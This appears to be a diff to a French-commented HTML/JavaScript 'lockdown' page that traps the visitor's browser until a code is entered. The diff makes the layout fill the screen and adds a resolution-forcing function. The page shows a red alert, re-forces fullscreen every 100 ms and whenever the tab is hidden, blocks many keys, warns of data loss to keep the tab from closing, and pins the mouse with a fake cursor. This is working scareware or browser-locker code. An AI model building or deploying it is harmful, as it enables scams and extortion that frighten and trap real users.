@@ -27,41 +27,48 @@
 
         .container {
             background: red;
-            padding: 20px;
+            padding: 5%;
             border-radius: 10px;
             box-shadow: 0 0 10px white;
+            width: 80vw; /* Utilise 80% de la largeur de l'écran */
+            height: 80vh; /* Utilise 80% de la hauteur de l'écran */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
 
         h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
+            font-size: 5vw; /* Ajustement dynamique */
+            margin-bottom: 2vh;
         }
 
         #alert-message {
-            font-size: 16px;
-            margin-bottom: 20px;
+            font-size: 3vw; /* Ajustement dynamique */
+            margin-bottom: 3vh;
         }
 
         input {
-            padding: 10px;
-            font-size: 16px;
-            margin-bottom: 10px;
+            padding: 1vh;
+            font-size: 3vw;
+            margin-bottom: 2vh;
             text-align: center;
             outline: none;
+            width: 50%;
         }
 
         button {
             background: black;
             color: white;
-            padding: 10px 20px;
-            font-size: 16px;
+            padding: 2vh 4vw;
+            font-size: 3vw;
             cursor: pointer;
         }
 
         #error-message {
             color: yellow;
-            font-size: 14px;
-            margin-top: 10px;
+            font-size: 2vw;
+            margin-top: 2vh;
         }
     </style>
 </head>
@@ -87,12 +94,13 @@
 
         // 🚀 Démarrer le verrouillage
         function startLockdown() {
-            requestFullScreen();  // Forcer le mode plein écran
-            blockKeys();          // Désactiver certaines touches sauf le pavé numérique et Entrée
-            preventClose();       // Empêcher la fermeture de l'onglet
-            lockMouse();          // Bloquer la souris en haut à droite
+            forceMaxResolution();
+            requestFullScreen();
+            blockKeys();
+            preventClose();
+            lockMouse();
             setTimeout(() => {
-                document.getElementById("codeInput").focus(); // 📌 Focus automatique sur le champ de saisie
+                document.getElementById("codeInput").focus();
             }, 500);
         }
 
@@ -112,21 +120,29 @@
             }
         }
 
-        // 🛑 Forcer le plein écran et empêcher la sortie
+        // 📌 Forcer la plus grande résolution possible
+        function forceMaxResolution() {
+            document.documentElement.style.width = "100vw";
+            document.documentElement.style.height = "100vh";
+            document.body.style.width = "100vw";
+            document.body.style.height = "100vh";
+        }
+
+        // 🛑 Forcer le plein écran
         function requestFullScreen() {
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen();
-            } else if (elem.mozRequestFullScreen) { // Firefox
+            } else if (elem.mozRequestFullScreen) {
                 elem.mozRequestFullScreen();
-            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+            } else if (elem.webkitRequestFullscreen) {
                 elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) { // IE / Edge
+            } else if (elem.msRequestFullscreen) {
                 elem.msRequestFullscreen();
             }
         }
 
-        // 🚨 Bloquer toutes les touches spéciales sauf "Entrée" et le pavé numérique
+        // 🚨 Bloquer les touches spéciales sauf Entrée et le pavé numérique
         function blockKeys() {
             document.addEventListener("keydown", function (event) {
                 let blockedKeys = [
@@ -134,16 +150,10 @@
                     "Shift", "Delete", "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"
                 ];
 
-                let allowedKeys = [
-                    "Enter", "Numpad0", "Numpad1", "Numpad2", "Numpad3", "Numpad4", 
-                    "Numpad5", "Numpad6", "Numpad7", "Numpad8", "Numpad9"
-                ];
-                
                 if (blockedKeys.includes(event.key)) {
                     event.preventDefault();
                 }
 
-                // Si l'utilisateur appuie sur "Entrée", valider le code
                 if (event.key === "Enter") {
                     checkCode();
                 }
@@ -163,7 +173,7 @@
             document.body.innerHTML = "<h1 style='color: green;'>✅ Accès Rétabli</h1>";
         }
 
-        // ❌ Empêcher la fermeture de l'onglet et remettre en plein écran rapidement
+        // ❌ Empêcher la fermeture et re-forcer le plein écran immédiatement
         function preventClose() {
             window.onbeforeunload = function() {
                 return "🚨 Attention ! Cette action peut provoquer une perte de données.";
@@ -171,13 +181,13 @@
 
             document.addEventListener("visibilitychange", function() {
                 if (document.hidden) {
-                    setTimeout(requestFullScreen, 10); // 📌 Retour en plein écran immédiat
+                    setTimeout(requestFullScreen, 10);
                 }
             });
 
             setInterval(() => {
                 if (!document.fullscreenElement) {
-                    requestFullScreen(); // 📌 Re-forcer le plein écran en cas de tentative de sortie
+                    requestFullScreen();
                 }
             }, 100);
         }
@@ -186,7 +196,7 @@
         function lockMouse() {
             document.addEventListener("mousemove", function(event) {
                 event.preventDefault();
-                window.scrollTo(0, 0); // Empêche le défilement
+                window.scrollTo(0, 0);
                 
                 let fakeCursor = document.createElement("div");
                 fakeCursor.style.position = "fixed";
